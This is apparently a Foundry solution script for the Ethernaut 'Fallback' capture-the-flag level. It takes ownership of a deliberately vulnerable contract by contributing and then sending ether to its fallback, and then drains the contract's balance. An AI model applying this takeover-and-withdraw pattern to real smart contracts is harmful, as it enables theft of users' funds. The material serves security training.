// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {EthernautScript} from "src/common/EthernautScript.sol";
import {Fallback} from "./Problem.sol";

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        vm.startBroadcast();
        Fallback instance = Fallback(_instanceAddress);
        instance.contribute{value: 1}();
        assert(instance.contributions(tx.origin) > 0);
        address(instance).call{value: 1}("");
        assert(instance.owner() == tx.origin);
        instance.withdraw();
        assert(address(instance).balance == 0);
        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns (address) {
        return 0x9CB391dbcD447E645D6Cb55dE6ca23164130D008;
    }
}
